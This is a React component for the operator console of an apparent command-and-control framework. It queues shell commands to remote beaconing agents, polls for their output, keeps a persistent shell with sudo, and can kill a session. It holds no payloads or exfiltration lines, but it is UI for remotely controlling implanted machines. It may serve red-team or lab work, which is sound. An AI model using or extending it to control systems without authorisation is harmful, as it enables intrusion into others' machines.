import React, { useState, useRef, useEffect, useCallback } from 'react';
import { X, Terminal, Loader2, PowerOff } from 'lucide-react';
import {
  queueAgentCommand,
  fetchAgentResults,
  resolveCommandType,
  getLocalHelpText,
  eliminateSession,
} from '../../api/c2Api';

const BEACON_WAIT_MS = 90000;
const POLL_INTERVAL_MS = 5000;

export function AgentCliPanel({ agent, isOpen, onClose, commandResults, isConnected }) {
  const [input, setInput] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const [pendingCommandId, setPendingCommandId] = useState(null);
  const [entries, setEntries] = useState([]);
  const [isKilling, setIsKilling] = useState(false);
  const logRef = useRef(null);
  const inputRef = useRef(null);
  const pollRef = useRef(null);
  const timeoutRef = useRef(null);

  const appendEntry = useCallback((entry) => {
    setEntries((prev) => [...prev, entry]);
  }, []);

  const clearTimers = useCallback(() => {
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
    if (timeoutRef.current) {
      clearTimeout(timeoutRef.current);
      timeoutRef.current = null;
    }
  }, []);

  const finishCommand = useCallback(
    (output, status = 'completed') => {
      clearTimers();
      setPendingCommandId(null);
      setIsExecuting(false);
      if (output) {
        appendEntry({ type: 'response', text: output, status });
      }
    },
    [appendEntry, clearTimers],
  );

  useEffect(() => {
    if (!agent) return;
    clearTimers();
    setEntries([
      {
        type: 'system',
        text: `Connected to ${agent.hostname} (${agent.id.slice(0, 8)}…). Persistent shell — cd, sudo, and env vars carry over between commands.`,
      },
    ]);
    setInput('');
    setIsExecuting(false);
    setIsKilling(false);
    setPendingCommandId(null);
  }, [agent?.id, clearTimers]);

  useEffect(() => {
    if (!pendingCommandId || !commandResults) return;
    const result = commandResults.get(pendingCommandId);
    if (result && result.agent_id === agent?.id) {
      finishCommand(result.output || `[${result.status}]`, result.status);
    }
  }, [commandResults, pendingCommandId, agent?.id, finishCommand]);

  useEffect(() => {
    if (!pendingCommandId || !agent?.id) return;

    const poll = async () => {
      try {
        const results = await fetchAgentResults(agent.id);
        if (!Array.isArray(results)) return;
        const match = results.find((r) => r.command_id === pendingCommandId);
        if (match) {
          finishCommand(match.output || `[${match.status}]`, match.status);
        }
      } catch {
        /* server unreachable — keep polling */
      }
    };

    pollRef.current = setInterval(poll, POLL_INTERVAL_MS);
    timeoutRef.current = setTimeout(() => {
      finishCommand(
        'Timed out waiting for agent beacon. Command may still execute on next check-in.',
        'timeout',
      );
    }, BEACON_WAIT_MS);

    return clearTimers;
  }, [pendingCommandId, agent?.id, finishCommand, clearTimers]);

  useEffect(() => {
    if (logRef.current) {
      logRef.current.scrollTop = logRef.current.scrollHeight;
    }
  }, [entries, isExecuting]);

  useEffect(() => {
    if (isOpen) inputRef.current?.focus();
  }, [isOpen, agent?.id]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    const command = input.trim();
    if (!command || isExecuting) return;

    appendEntry({ type: 'command', text: command });
    setInput('');

    if (command.toLowerCase() === 'help') {
      appendEntry({ type: 'response', text: getLocalHelpText(agent) });
      return;
    }

    if (!isConnected) {
      appendEntry({
        type: 'response',
        text: 'Dashboard WebSocket offline. Start the C2 server and retry.',
        status: 'error',
      });
      return;
    }

    setIsExecuting(true);

    try {
      const { commandType, payload } = resolveCommandType(agent, command);
      const { command_id: commandId } = await queueAgentCommand(agent.id, payload, commandType);
      setPendingCommandId(commandId);
      appendEntry({
        type: 'system',
        text: `Queued ${commandId.slice(0, 8)}… (${commandType}). Waiting for agent beacon…`,
      });
    } catch (err) {
      setIsExecuting(false);
      appendEntry({
        type: 'response',
        text: `Failed to queue command: ${err.message}`,
        status: 'error',
      });
    }
  };

  const handleEliminateSession = async () => {
    if (isKilling) return;
    setIsKilling(true);
    clearTimers();
    setPendingCommandId(null);
    setIsExecuting(false);

    appendEntry({
      type: 'system',
      text: 'Eliminating session — queuing session_kill command for agent…',
    });

    try {
      await eliminateSession(agent.id);
      appendEntry({
        type: 'response',
        text: 'Session eliminated. Persistent shell will be killed on next beacon.\nWorking directory resets on the next command.',
        status: 'error',
      });
    } catch (err) {
      appendEntry({
        type: 'response',
        text: `Eliminate session failed: ${err.message}`,
        status: 'error',
      });
    } finally {
      setIsKilling(false);
    }
  };

  if (!agent) return null;

  return (
    <>
      {isOpen && (
        <button
          type="button"
          aria-label="Close agent panel"
          className="fixed inset-0 z-30 bg-black/50 lg:hidden"
          onClick={onClose}
        />
      )}

      <aside
        className={[
          'font-terminal fixed inset-y-0 right-0 z-40 flex w-full flex-col border-l border-slate-700 bg-[#0d1117] shadow-2xl transition-all duration-300 ease-out sm:w-[420px] lg:relative lg:inset-auto lg:z-0 lg:shrink-0',
          isOpen
            ? 'translate-x-0 lg:w-[420px]'
            : 'translate-x-full lg:w-0 lg:border-l-0 lg:overflow-hidden lg:opacity-0',
        ].join(' ')}
      >
        <div className="flex shrink-0 items-center justify-between border-b border-slate-700/80 bg-[#161b22] px-4 py-2.5">
          <div className="flex items-center gap-2">
            <Terminal className="h-3.5 w-3.5 text-emerald-400" />
            <span className="text-xs text-slate-300">{agent.hostname}</span>
            <span className="text-[10px] text-slate-600">·</span>
            <span className="text-[10px] text-slate-500">{agent.id.slice(0, 12)}…</span>
            <span
              className={[
                'ml-1 h-1.5 w-1.5 rounded-full',
                isConnected ? 'bg-emerald-400' : 'bg-red-500',
              ].join(' ')}
              title={isConnected ? 'C2 connected' : 'C2 offline'}
            />
          </div>
          <div className="flex items-center gap-1">
            <button
              type="button"
              id="eliminate-session-btn"
              onClick={handleEliminateSession}
              disabled={isKilling}
              title="Eliminate Session — kills persistent shell, resets working directory"
              className="flex items-center gap-1 rounded px-2 py-1 text-[10px] font-medium text-red-400 ring-1 ring-red-500/30 transition hover:bg-red-500/10 hover:text-red-300 disabled:opacity-50"
            >
              <PowerOff className="h-3 w-3" />
              {isKilling ? 'Killing…' : 'Eliminate'}
            </button>
            <button
              type="button"
              onClick={onClose}
              className="rounded p-1 text-slate-500 transition hover:bg-slate-800 hover:text-slate-300"
              aria-label="Close terminal"
            >
              <X className="h-4 w-4" />
            </button>
          </div>
        </div>

        <div
          ref={logRef}
          className="flex-1 overflow-y-auto px-4 py-3 text-[11px] leading-relaxed"
        >
          {entries.map((entry, i) => (
            <div key={i} className="mb-1.5 whitespace-pre-wrap break-words">
              {entry.type === 'command' && (
                <span>
                  <span className="text-emerald-500">$ </span>
                  <span className="text-slate-200">{entry.text}</span>
                </span>
              )}
              {entry.type === 'response' && (
                <span
                  className={
                    entry.status === 'error' ? 'text-red-400' : 'text-slate-400'
                  }
                >
                  {entry.text}
                </span>
              )}
              {entry.type === 'system' && (
                <span className="italic text-slate-600">{entry.text}</span>
              )}
            </div>
          ))}

          {isExecuting && (
            <div className="flex items-center gap-2 text-slate-500">
              <Loader2 className="h-3 w-3 animate-spin" />
              <span>Waiting for agent…</span>
            </div>
          )}
        </div>

        <form
          onSubmit={handleSubmit}
          className="flex shrink-0 items-center gap-2 border-t border-slate-700/80 bg-[#0d1117] px-4 py-3"
        >
          <span className="text-emerald-500">$</span>
          <input
            ref={inputRef}
            type="text"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            disabled={isExecuting}
            placeholder="shell command (help for usage)…"
            className="flex-1 bg-transparent text-[11px] text-slate-200 outline-none placeholder:text-slate-600 disabled:opacity-50"
            autoComplete="off"
            spellCheck={false}
          />
        </form>
      </aside>
    </>
  );
}
